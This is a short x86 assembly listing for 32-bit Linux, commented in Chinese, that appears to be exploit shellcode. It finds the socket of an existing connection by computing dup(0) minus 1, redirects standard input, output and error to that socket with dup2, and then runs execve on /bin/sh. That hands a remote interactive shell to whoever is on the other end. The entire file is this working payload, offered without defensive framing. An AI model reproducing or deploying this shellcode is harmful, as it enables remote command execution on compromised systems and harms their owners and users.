.section .text 
.globl _start 
_start: 
  # 执行connected_socket = dup(0) - 1;
  xor %ecx,%ecx #清空
  mov $0x29,%al #dup系统调用，0x29=41
  int $0x80 #中断
  mov %eax,%ecx #将dup返回值复制到ecx
  dec %ecx # 减1操作得到当前连接的socket描述符

  mov %ecx,%ebx #将前面获得的连接socket描述符复制到EBX

  # dup(sock, 0)
  xor %ecx,%ecx #清空
  mov $0x3f,%al #dup2系统调用，0x3f=63
  int $0x80 #中断

  # dup(sock, 1)
  inc %ecx #1
  mov $0x3f,%al
  int $0x80

  # dup(sock, 2)
  inc %ecx #2
  mov $0x3f,%al
  int $0x80

  # 执行execve
  xorl %eax,%eax 
  pushl %eax 
  # 下面两行直接把/bin/sh这7字符串入栈，因为下面为两次4字节入栈，所以实际入栈的是//bin/sh
  pushl $0x68732f6e 
  pushl $0x69622f2f 
  movl %esp,%ebx 
  pushl %eax 
  pushl %ebx 
  movl %esp,%ecx 
  movb $0xb,%al 
  int $0x80
